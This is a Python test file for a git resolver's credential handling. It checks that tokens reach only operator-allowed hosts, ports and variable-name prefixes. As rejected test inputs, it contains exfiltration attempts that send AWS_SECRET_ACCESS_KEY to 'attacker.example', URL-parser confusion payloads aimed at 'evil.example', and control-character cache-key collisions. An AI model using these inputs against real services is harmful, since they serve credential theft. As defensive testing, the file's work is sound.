"""A credential goes only where the operator allows, under a name the operator allows.

A contract may come from a pull request. It can say which environment variable it wants and
which url it wants to fetch, so it must not decide where a credential goes: the operator's
settings (the process environment) do. These tests pin that, and the rules around it.
"""

from __future__ import annotations

import hashlib
from typing import Any, List

import pytest

from data_product_forge_custom_scaffold.resolvers import git as git_resolver
from data_product_forge_custom_scaffold.resolvers.base import ResolutionError
from data_product_forge_custom_scaffold.resolvers.git import (
    GitResolver,
    _add_git_config,
    _bind_auth,
    _Credential,
    _sanitise_url,
)
from tests.helpers import git_source, git_that_fails, patch_run

URL = "https://github.com/org/bundle"
SECRET = "ghp_VERYSECRETVALUE"
HOSTS = "FLUID_CUSTOM_SCAFFOLD_AUTH_HOSTS"
PREFIXES = "FLUID_CUSTOM_SCAFFOLD_SECRET_PREFIXES"


@pytest.fixture
def operator(monkeypatch):
    """An operator who allows github.com and holds a token for it."""
    monkeypatch.setenv(HOSTS, "github.com")
    monkeypatch.delenv(PREFIXES, raising=False)
    monkeypatch.setenv("FLUID_SCAFFOLD_TOKEN", SECRET)
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "AKIAnotforyou")


def _no_git(monkeypatch) -> List[Any]:
    """Fail the test if anything starts a process: a refused source must not reach git."""

    def refuse(args: Any, kwargs: Any) -> Any:
        raise AssertionError(f"a process was started: {args}")

    return patch_run(monkeypatch, git_resolver, refuse)


def _source(url: str = URL, auth: Any = None, ref: str = "v1") -> dict:
    return git_source(url, ref, auth)


# ── hosts ────────────────────────────────────────────────────────────────────


def test_nothing_is_sent_anywhere_until_the_operator_lists_a_host(monkeypatch) -> None:
    monkeypatch.delenv(HOSTS, raising=False)
    monkeypatch.setenv("FLUID_SCAFFOLD_TOKEN", SECRET)
    _no_git(monkeypatch)

    with pytest.raises(ResolutionError) as refused:
        GitResolver().resolve(_source(auth={"secret_ref": "FLUID_SCAFFOLD_TOKEN"}))

    assert HOSTS in str(refused.value) and "github.com" in str(refused.value)
    assert SECRET not in str(refused.value)


def test_a_host_the_operator_did_not_list_gets_nothing(operator, monkeypatch) -> None:
    _no_git(monkeypatch)

    with pytest.raises(ResolutionError, match="attacker.example"):
        GitResolver().resolve(
            _source("https://attacker.example/x.git", {"secret_ref": "FLUID_SCAFFOLD_TOKEN"})
        )


def test_the_contract_cannot_widen_what_the_operator_allows(operator, monkeypatch) -> None:
    # Extra keys in `auth` (the schema allows them) change nothing.
    _no_git(monkeypatch)
    auth = {"secret_ref": "FLUID_SCAFFOLD_TOKEN", "hosts": ["attacker.example"], "allow": "*"}

    with pytest.raises(ResolutionError, match="attacker.example"):
        GitResolver().resolve(_source("https://attacker.example/x.git", auth))


@pytest.mark.parametrize(
    ("listed", "url", "allowed"),
    [
        ("github.com", "https://github.com/o/r", True),
        ("GitHub.COM", "https://github.com/o/r", True),
        ("github.com", "https://GITHUB.com/o/r", True),
        ("a.example, github.com ,b.example", "https://github.com/o/r", True),
        ("github.com", "https://api.github.com/o/r", False),  # exact, not a suffix
        ("github.com", "https://notgithub.com/o/r", False),
        ("", "https://github.com/o/r", False),
    ],
)
def test_hosts_match_exactly_and_without_regard_to_case(
    monkeypatch, listed: str, url: str, allowed: bool
) -> None:
    monkeypatch.setenv(HOSTS, listed)
    auth = {"secret_ref": "FLUID_SCAFFOLD_TOKEN"}

    if allowed:
        assert _bind_auth(url, auth) is not None
    else:
        with pytest.raises(ResolutionError):
            _bind_auth(url, auth)


@pytest.mark.parametrize(
    ("listed", "url", "allowed"),
    [
        ("github.com", "https://github.com:443/o/r", True),  # 443 is the https default
        ("github.com:443", "https://github.com/o/r", True),
        ("github.com", "https://github.com:8443/o/r", False),  # another port, another service
        ("github.com:8443", "https://github.com:8443/o/r", True),
        ("github.com:8443", "https://github.com/o/r", False),
        ("github.com:8443", "https://github.com:9443/o/r", False),
        ("GitHub.com:8443", "https://GITHUB.com:8443/o/r", True),
        ("github.com, github.com:8443", "https://github.com:8443/o/r", True),
        ("github.com:eight", "https://github.com:8443/o/r", False),  # not host:port: allows nothing
    ],
)
def test_a_credential_goes_only_to_the_port_the_operator_allowed(
    monkeypatch, listed: str, url: str, allowed: bool
) -> None:
    # A port is another service, often another owner: a host entry is the https default only.
    monkeypatch.setenv(HOSTS, listed)
    auth = {"secret_ref": "FLUID_SCAFFOLD_TOKEN"}

    if allowed:
        assert _bind_auth(url, auth) is not None
    else:
        with pytest.raises(ResolutionError, match="not a host this operator allows"):
            _bind_auth(url, auth)


def test_a_refusal_names_the_host_and_port_that_would_be_allowed(monkeypatch) -> None:
    monkeypatch.setenv(HOSTS, "git.example")

    with pytest.raises(ResolutionError, match=r"'git\.example:8443' is not a host") as refused:
        _bind_auth("https://git.example:8443/o/r", {"secret_ref": "FLUID_SCAFFOLD_TOKEN"})

    assert "host or host:port" in str(refused.value)


# ── names ────────────────────────────────────────────────────────────────────


def test_a_contract_cannot_name_any_variable_it_likes(operator, monkeypatch) -> None:
    # The exfiltration path: any variable and any host. The host is even allowed here.
    monkeypatch.setenv(HOSTS, "attacker.example")
    _no_git(monkeypatch)

    with pytest.raises(ResolutionError) as refused:
        GitResolver().resolve(
            _source("https://attacker.example/x.git", {"secret_ref": "AWS_SECRET_ACCESS_KEY"})
        )

    assert "FLUID_SCAFFOLD_" in str(refused.value) and PREFIXES in str(refused.value)
    assert "AKIAnotforyou" not in str(refused.value)


@pytest.mark.parametrize(
    ("name", "allowed"),
    [
        ("FLUID_SCAFFOLD_TOKEN", True),
        ("FLUID_SCAFFOLD_ANYTHING_ELSE", True),
        ("FLUID_SCAFFOLDING", False),  # the prefix ends in an underscore
        ("fluid_scaffold_token", False),  # names are case-sensitive
        ("GITHUB_TOKEN", False),
        ("PATH", False),
    ],
)
def test_the_default_prefix_is_fixed(operator, name: str, allowed: bool) -> None:
    if allowed:
        assert _bind_auth(URL, {"secret_ref": name}).name == name  # type: ignore[union-attr]
    else:
        with pytest.raises(ResolutionError, match="FLUID_SCAFFOLD_"):
            _bind_auth(URL, {"secret_ref": name})


def test_the_operator_can_allow_more_prefixes(operator, monkeypatch) -> None:
    monkeypatch.setenv(PREFIXES, "MYORG_TOKENS_, ci_")

    assert _bind_auth(URL, {"secret_ref": "MYORG_TOKENS_GITHUB"}) is not None
    assert _bind_auth(URL, {"secret_ref": "ci_bot"}) is not None
    assert _bind_auth(URL, {"secret_ref": "FLUID_SCAFFOLD_TOKEN"}) is not None  # still allowed
    with pytest.raises(ResolutionError):
        _bind_auth(URL, {"secret_ref": "GITHUB_TOKEN"})


@pytest.mark.parametrize(
    "name", ["not a name", "1ABC", "A-B", "", None, 7, 0, False, ["X"], [], {}]
)
def test_a_secret_name_must_be_a_plain_variable_name(operator, name) -> None:
    auth = {"secret_ref": name}
    if name is None or (isinstance(name, str) and not name):
        assert _bind_auth(URL, auth) is None  # no auth asked for
    else:
        with pytest.raises(ResolutionError, match="env-var-shaped"):
            _bind_auth(URL, auth)


@pytest.mark.parametrize("auth", [{}, {"hosts": ["x"]}])
def test_an_auth_block_that_asks_for_nothing_asks_for_nothing(operator, auth) -> None:
    assert _bind_auth(URL, auth) is None


@pytest.mark.parametrize("auth", ["FLUID_SCAFFOLD_TOKEN", ["FLUID_SCAFFOLD_TOKEN"], 7, True])
def test_an_auth_that_is_not_a_mapping_is_an_error_not_a_source_without_a_credential(
    operator, monkeypatch, auth
) -> None:
    # `auth: FLUID_SCAFFOLD_TOKEN` is a likely slip; going on without a credential would hide it.
    _no_git(monkeypatch)

    with pytest.raises(ResolutionError, match="auth must be a mapping"):
        GitResolver().resolve({"kind": "git", "url": URL, "ref": "v1", "auth": auth})


def test_a_refused_name_is_never_looked_up(operator, monkeypatch) -> None:
    looked_up: List[str] = []
    real_get = git_resolver.os.environ.get

    class Spy(dict):
        def get(self, key, default=None):  # type: ignore[override]
            looked_up.append(key)
            return real_get(key, default)

    monkeypatch.setattr(git_resolver.os, "environ", Spy(git_resolver.os.environ))
    _no_git(monkeypatch)

    with pytest.raises(ResolutionError):
        GitResolver().resolve(_source(auth={"secret_ref": "AWS_SECRET_ACCESS_KEY"}))

    assert "AWS_SECRET_ACCESS_KEY" not in looked_up


# ── schemes ──────────────────────────────────────────────────────────────────


def test_git_plus_https_with_auth_is_an_error_not_a_silent_anonymous_fetch(
    operator, monkeypatch
) -> None:
    _no_git(monkeypatch)

    with pytest.raises(ResolutionError, match=r"git\+https://.*use an https://"):
        GitResolver().resolve(
            _source("git+https://github.com/org/bundle", {"secret_ref": "FLUID_SCAFFOLD_TOKEN"})
        )


@pytest.mark.parametrize("url", ["ssh://git@github.com/org/bundle", "git@github.com:org/bundle"])
def test_auth_is_only_sent_over_https(operator, monkeypatch, url: str) -> None:
    _no_git(monkeypatch)

    with pytest.raises(ResolutionError, match="only sent over https"):
        GitResolver().resolve(_source(url, {"secret_ref": "FLUID_SCAFFOLD_TOKEN"}))


# ── credentials in the url ───────────────────────────────────────────────────


@pytest.mark.parametrize(
    "url",
    [
        "https://user:hunter2@github.com/org/bundle",
        "https://hunter2@github.com/org/bundle",
        "https://x-access-token:ghp_VERYSECRETVALUE@github.com/org/bundle",
        "ssh://user:hunter2@github.com/org/bundle",
    ],
)
def test_a_url_that_carries_credentials_is_refused_and_not_echoed(
    operator, monkeypatch, url: str
) -> None:
    # They would be written into the lock as mirror_url, which is committed.
    _no_git(monkeypatch)

    with pytest.raises(ResolutionError, match="must not carry credentials") as refused:
        GitResolver().resolve(_source(url))

    assert "hunter2" not in str(refused.value) and "VERYSECRET" not in str(refused.value)


@pytest.mark.parametrize(
    "url",
    [
        # The cache key joins its parts with NUL: this url would collide with the key of the
        # same url when it asks for FLUID_SCAFFOLD_TOKEN at github.com.
        "https://github.com/org/bundle\0github.com\0FLUID_SCAFFOLD_TOKEN",
        "https://github.com/org/bundle\n",
        "https://github.com/org/\tbundle",
        "https://github.com/org/bundle\x7f",
        "ssh://git@github.com/org/bundle\0",
    ],
)
def test_a_url_with_a_control_character_is_refused(operator, monkeypatch, url: str) -> None:
    _no_git(monkeypatch)

    for auth in (None, {"secret_ref": "FLUID_SCAFFOLD_TOKEN"}):
        with pytest.raises(ResolutionError, match="control characters"):
            GitResolver().resolve(_source(url, auth))


def test_the_lock_records_the_url_as_written_and_nothing_secret(
    operator, monkeypatch, tmp_path
) -> None:
    # A user name alone on an ssh url is an account, not a credential: it stays.
    monkeypatch.setenv("FLUID_CUSTOM_SCAFFOLD_CACHE", str(tmp_path))
    cache_dir = GitResolver._cache_dir_for("ssh://git@github.com/org/bundle", "v1")
    cache_dir.mkdir(parents=True)
    (cache_dir / "fluid-scaffold.yaml").write_text("apiVersion: forge.scaffold/v1\n")

    bundle = GitResolver().resolve(_source("ssh://git@github.com/org/bundle"))

    assert bundle.mirror_url == "ssh://git@github.com/org/bundle"


# ── the cache key ────────────────────────────────────────────────────────────


def test_a_source_without_auth_keeps_the_key_it_always_had() -> None:
    expected = hashlib.sha256(URL.encode()).hexdigest()[:16]

    assert GitResolver._cache_dir_for(URL, "v1").parent.name == expected


def test_the_key_names_the_credential_and_never_its_value(operator) -> None:
    plain = GitResolver._cache_dir_for(URL, "v1")
    with_a = GitResolver._cache_dir_for(
        URL, "v1", _bind_auth(URL, {"secret_ref": "FLUID_SCAFFOLD_A"})
    )
    with_b = GitResolver._cache_dir_for(
        URL, "v1", _bind_auth(URL, {"secret_ref": "FLUID_SCAFFOLD_B"})
    )

    assert len({plain.parent, with_a.parent, with_b.parent}) == 3
    expected = hashlib.sha256(f"{URL}\0github.com\0FLUID_SCAFFOLD_A".encode()).hexdigest()[:16]
    assert with_a.parent.name == expected  # url, host and variable name: no value in it


def test_the_key_names_the_port_a_credential_goes_to(operator, monkeypatch) -> None:
    url = "https://github.com:8443/org/bundle"
    monkeypatch.setenv(HOSTS, "github.com:8443")
    binding = _bind_auth(url, {"secret_ref": "FLUID_SCAFFOLD_A"})

    key = GitResolver._cache_dir_for(url, "v1", binding)

    expected = hashlib.sha256(f"{url}\0github.com:8443\0FLUID_SCAFFOLD_A".encode()).hexdigest()
    assert key.parent.name == expected[:16]


# ── the credential object ────────────────────────────────────────────────────


def test_a_credential_does_not_show_its_token_in_a_repr_or_in_text() -> None:
    credential = _Credential(url=URL, name="FLUID_SCAFFOLD_TOKEN", token=SECRET)

    assert SECRET not in repr(credential)
    redacted = credential.redact(f"bad: {SECRET} and {credential._basic}")
    assert SECRET not in redacted and credential._basic not in redacted


def test_the_header_is_bound_to_the_url_and_redirects_are_refused() -> None:
    credential = _Credential(url=URL, name="FLUID_SCAFFOLD_TOKEN", token=SECRET)

    keys = dict(credential.config())
    assert keys[f"http.{URL}.extraHeader"].startswith("Authorization: Basic ")
    assert keys["http.followRedirects"] == "false"


def test_config_pairs_follow_the_ones_the_caller_already_set() -> None:
    env = {"GIT_CONFIG_COUNT": "1", "GIT_CONFIG_KEY_0": "user.name", "GIT_CONFIG_VALUE_0": "me"}

    _add_git_config(env, [("a.b", "1"), ("c.d", "2")])

    assert env["GIT_CONFIG_COUNT"] == "3"
    assert (env["GIT_CONFIG_KEY_0"], env["GIT_CONFIG_VALUE_0"]) == ("user.name", "me")
    assert (env["GIT_CONFIG_KEY_1"], env["GIT_CONFIG_VALUE_1"]) == ("a.b", "1")
    assert (env["GIT_CONFIG_KEY_2"], env["GIT_CONFIG_VALUE_2"]) == ("c.d", "2")


@pytest.mark.parametrize("count", ["-1", "-5", "x", "", " "])
def test_a_count_git_would_reject_never_moves_the_pairs_below_zero(count: str) -> None:
    env = {"GIT_CONFIG_COUNT": count}

    _add_git_config(env, [("a.b", "1"), ("c.d", "2")])

    assert env["GIT_CONFIG_COUNT"] == "2"  # ours stand alone, from index 0
    assert (env["GIT_CONFIG_KEY_0"], env["GIT_CONFIG_KEY_1"]) == ("a.b", "c.d")
    assert not any(key.startswith("GIT_CONFIG_KEY_-") for key in env)


def test_a_git_too_old_to_carry_the_credential_is_an_error(operator, monkeypatch) -> None:
    monkeypatch.setattr(git_resolver, "_git_version", lambda: (2, 30))

    with pytest.raises(ResolutionError, match=r"git 2\.31 or newer"):
        git_resolver._credential(URL, {"secret_ref": "FLUID_SCAFFOLD_TOKEN"})


@pytest.mark.parametrize(
    ("detail", "expected"),
    [
        (
            "fatal: could not read Username for 'https://h': terminal prompts disabled",
            "did not accept the credential from FLUID_SCAFFOLD_TOKEN",
        ),
        (
            "fatal: unable to access 'https://h/': The requested URL returned error: 403",
            "did not accept the credential",
        ),
        ("remote: Authentication failed", "did not accept the credential"),
        (
            "fatal: unable to access 'https://h/': The requested URL returned error: 301",
            "never sent to a redirect target",
        ),
        (
            "fatal: unable to access 'https://h/': The requested URL returned error: 307",
            "never sent to a redirect target",
        ),
        (
            "fatal: unable to access 'https://h/': The requested URL returned error: 303",
            "never sent to a redirect target",
        ),
        ("fatal: repository 'https://h/x' not found", ""),
        ("", ""),
    ],
)
def test_a_failed_credentialed_fetch_says_what_to_check(detail: str, expected: str) -> None:
    credential = _Credential(url=URL, name="FLUID_SCAFFOLD_TOKEN", token=SECRET)

    hint = credential.hint(detail)

    assert (expected in hint) if expected else hint == ""
    assert SECRET not in hint  # it names the variable, never the value


def test_the_hint_reaches_the_error_a_caller_sees(monkeypatch) -> None:
    credential = _Credential(url=URL, name="FLUID_SCAFFOLD_TOKEN", token=SECRET)

    refused = f"fatal: could not read Username for '{URL}': terminal prompts disabled"
    patch_run(monkeypatch, git_resolver, git_that_fails(URL, refused, returncode=128))

    with pytest.raises(
        ResolutionError, match="did not accept the credential from FLUID_SCAFFOLD_TOKEN"
    ):
        GitResolver._git(["clone", URL, "/x"], url=URL, what="clone", credential=credential)


@pytest.mark.parametrize(
    "url",
    [
        "https://github.com\\@evil.example/o/r",  # a backslash: a parser may read it as a slash
        "https://github.com\\.evil.example/o/r",
        "https://github.com%2f@evil.example/o/r",
        "https://github.com#@evil.example/o/r",
        "https://github.com?@evil.example/o/r",
        "https://github.com/o/r?x=1",
        "https://github.com/o/r#frag",
        "https://github.com/o /r",
        "https://github.com/o/r\n",
        "https://[::1]/o/r",
        "https://g\u00efthub.com/o/r",  # not ASCII
        "https://github.com:99999999/o/r",
        "https://github.com:/o/r",
        "https:///o/r",
        "https://[::1/o/r",  # urlsplit raises ValueError on this one: no bare ValueError escapes
        "https://[/o/r",
        "https://github.com/o/r\0",
    ],
)
def test_a_credential_goes_only_to_a_url_no_parser_can_read_two_ways(operator, url: str) -> None:
    with pytest.raises(ResolutionError):
        _bind_auth(url, {"secret_ref": "FLUID_SCAFFOLD_TOKEN"})


def test_a_malformed_url_with_auth_is_a_resolution_error_not_a_value_error(
    operator, monkeypatch
) -> None:
    _no_git(monkeypatch)

    with pytest.raises(ResolutionError, match="of the form https://host"):
        GitResolver().resolve(_source("https://[::1/x", {"secret_ref": "FLUID_SCAFFOLD_TOKEN"}))


def test_the_host_that_is_checked_is_the_host_the_url_names(operator, monkeypatch) -> None:
    # An `@` or a second authority in the path is not a user part and not another host.
    monkeypatch.setenv(HOSTS, "127.0.0.1:7")
    url = "https://127.0.0.1:7/@localhost:8/x"

    binding = _bind_auth(url, {"secret_ref": "FLUID_SCAFFOLD_TOKEN"})

    assert binding is not None and binding.endpoint == "127.0.0.1:7"


@pytest.mark.parametrize(
    ("url", "shown"),
    [
        ("https://user:pw@host.example/o/r", "https://[redacted]@host.example/o/r"),
        ("https://token@host.example/o/r", "https://[redacted]@host.example/o/r"),
        ("HTTPS://user:pw@host.example/o/r", "https://[redacted]@host.example/o/r"),
        ("https://host.example/o/r", "https://host.example/o/r"),
        # An `@` after the authority is part of the path: the text must still name the host
        # git contacts, not one that appears after the `@`.
        ("https://127.0.0.1:7/@localhost:8/x", "https://127.0.0.1:7/@localhost:8/x"),
        ("https://host.example/o/r@v1", "https://host.example/o/r@v1"),
        ("ssh://git@host.example/o/r", "ssh://git@host.example/o/r"),
        ("git@host.example:o/r", "git@host.example:o/r"),
    ],
)
def test_error_text_hides_a_user_part_and_only_a_user_part(url: str, shown: str) -> None:
    assert _sanitise_url(url) == shown


@pytest.mark.parametrize(
    "url",
    [
        "https://github.com/org/bundle",
        "https://github.com/org/bundle.git",
        "https://github.com",
        "https://github.com:443/org/bundle",
        "https://github.com/org/my-bundle_v2/sub.dir",
    ],
)
def test_ordinary_https_urls_are_still_accepted(operator, url: str) -> None:
    assert _bind_auth(url, {"secret_ref": "FLUID_SCAFFOLD_TOKEN"}) is not None
